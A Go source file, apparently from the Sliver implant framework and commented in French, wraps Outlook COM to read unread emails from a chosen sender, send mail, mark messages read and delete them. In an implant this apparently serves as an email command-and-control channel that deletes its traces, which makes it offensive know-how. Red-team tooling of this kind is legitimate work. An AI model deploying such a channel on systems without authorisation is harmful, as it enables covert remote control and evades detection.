//go:build windows
// +build windows

package outlook

/*
	Sliver Implant Framework
	Copyright (C) 2024  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"errors"
	"fmt"
	"time"

	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
)

// OutlookCOMHelper wrapper pour les interactions COM avec Outlook
type OutlookCOMHelper struct {
	outlookApp *ole.IDispatch
	namespace  *ole.IDispatch
}

// NewOutlookCOMHelper initialise la connexion COM avec Outlook
func NewOutlookCOMHelper() (*OutlookCOMHelper, error) {
	// Initialiser COM
	err := ole.CoInitialize(0)
	if err != nil {
		// COM peut déjà être initialisé, on continue
	}

	// Créer instance Outlook.Application
	unknown, err := oleutil.CreateObject("Outlook.Application")
	if err != nil {
		return nil, fmt.Errorf("outlook not installed or not accessible: %w", err)
	}

	outlookApp, err := unknown.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		return nil, fmt.Errorf("failed to query outlook interface: %w", err)
	}

	// Obtenir MAPI namespace
	namespaceResult := oleutil.MustCallMethod(outlookApp, "GetNamespace", "MAPI")
	namespace := namespaceResult.ToIDispatch()

	return &OutlookCOMHelper{
		outlookApp: outlookApp,
		namespace:  namespace,
	}, nil
}

// GetFolder récupère un dossier Outlook (Inbox, Drafts, etc.)
func (h *OutlookCOMHelper) GetFolder(folderType int) (*ole.IDispatch, error) {
	if h.namespace == nil {
		return nil, errors.New("outlook namespace not initialized")
	}

	folderResult := oleutil.MustCallMethod(h.namespace, "GetDefaultFolder", folderType)
	folder := folderResult.ToIDispatch()

	if folder == nil {
		return nil, fmt.Errorf("failed to get folder type %d", folderType)
	}

	return folder, nil
}

// ReadUnreadEmails lit les emails non lus d'un dossier avec filtre sur l'expéditeur
func (h *OutlookCOMHelper) ReadUnreadEmails(folder *ole.IDispatch, senderFilter string) ([]*EmailMessage, error) {
	if folder == nil {
		return nil, errors.New("folder is nil")
	}

	itemsResult := oleutil.MustGetProperty(folder, "Items")
	items := itemsResult.ToIDispatch()
	defer items.Release()

	// Construire le filtre : non lus ET expéditeur spécifique
	filter := "[UnRead] = True"
	if senderFilter != "" {
		filter += " AND [SenderEmailAddress] = '" + senderFilter + "'"
	}

	restrictedItemsResult := oleutil.MustCallMethod(items, "Restrict", filter)
	restrictedItems := restrictedItemsResult.ToIDispatch()
	defer restrictedItems.Release()

	countResult := oleutil.MustGetProperty(restrictedItems, "Count")
	count := int(countResult.Val)

	var emails []*EmailMessage
	for i := 1; i <= count; i++ {
		itemResult := oleutil.MustCallMethod(restrictedItems, "Item", i)
		item := itemResult.ToIDispatch()

		subjectResult := oleutil.MustGetProperty(item, "Subject")
		subject := subjectResult.ToString()

		bodyResult := oleutil.MustGetProperty(item, "Body")
		body := bodyResult.ToString()

		senderResult := oleutil.MustGetProperty(item, "SenderEmailAddress")
		sender := senderResult.ToString()

		receivedTimeResult := oleutil.MustGetProperty(item, "ReceivedTime")
		receivedTime := receivedTimeResult.Value()

		emails = append(emails, &EmailMessage{
			Subject:      subject,
			Body:         body,
			Sender:       sender,
			ReceivedTime: receivedTime,
			Item:         item,
		})
	}

	return emails, nil
}

// SendEmail envoie un email via Outlook
func (h *OutlookCOMHelper) SendEmail(to, subject, body string) error {
	if h.outlookApp == nil {
		return errors.New("outlook application not initialized")
	}

	// Créer nouveau MailItem (olMailItem = 0)
	mailItemResult := oleutil.MustCallMethod(h.outlookApp, "CreateItem", 0)
	mailItem := mailItemResult.ToIDispatch()
	defer mailItem.Release()

	// Configurer l'email
	oleutil.MustPutProperty(mailItem, "To", to)
	oleutil.MustPutProperty(mailItem, "Subject", subject)
	oleutil.MustPutProperty(mailItem, "Body", body)

	// Envoyer l'email
	oleutil.MustCallMethod(mailItem, "Send")

	return nil
}

// MarkAsRead marque un email comme lu
func (h *OutlookCOMHelper) MarkAsRead(item *ole.IDispatch) error {
	if item == nil {
		return errors.New("email item is nil")
	}

	oleutil.MustPutProperty(item, "UnRead", false)
	oleutil.MustCallMethod(item, "Save")
	return nil
}

// DeleteEmail supprime un email (optionnel pour cleanup)
func (h *OutlookCOMHelper) DeleteEmail(item *ole.IDispatch) error {
	if item == nil {
		return errors.New("email item is nil")
	}

	oleutil.MustCallMethod(item, "Delete")
	return nil
}

// Close libère les ressources COM
func (h *OutlookCOMHelper) Close() {
	if h.namespace != nil {
		h.namespace.Release()
		h.namespace = nil
	}
	if h.outlookApp != nil {
		h.outlookApp.Release()
		h.outlookApp = nil
	}
	ole.CoUninitialize()
}

// EmailMessage représente un email Outlook
type EmailMessage struct {
	Subject      string
	Body         string
	Sender       string
	ReceivedTime interface{}
	Item         *ole.IDispatch
}

// GetReceivedTime retourne le temps de réception en tant que time.Time
func (e *EmailMessage) GetReceivedTime() (time.Time, error) {
	if e.ReceivedTime == nil {
		return time.Time{}, errors.New("received time is nil")
	}

	// Tenter de convertir en time.Time
	switch v := e.ReceivedTime.(type) {
	case time.Time:
		return v, nil
	case *time.Time:
		if v != nil {
			return *v, nil
		}
	}

	return time.Time{}, fmt.Errorf("unable to convert received time to time.Time: %T", e.ReceivedTime)
}
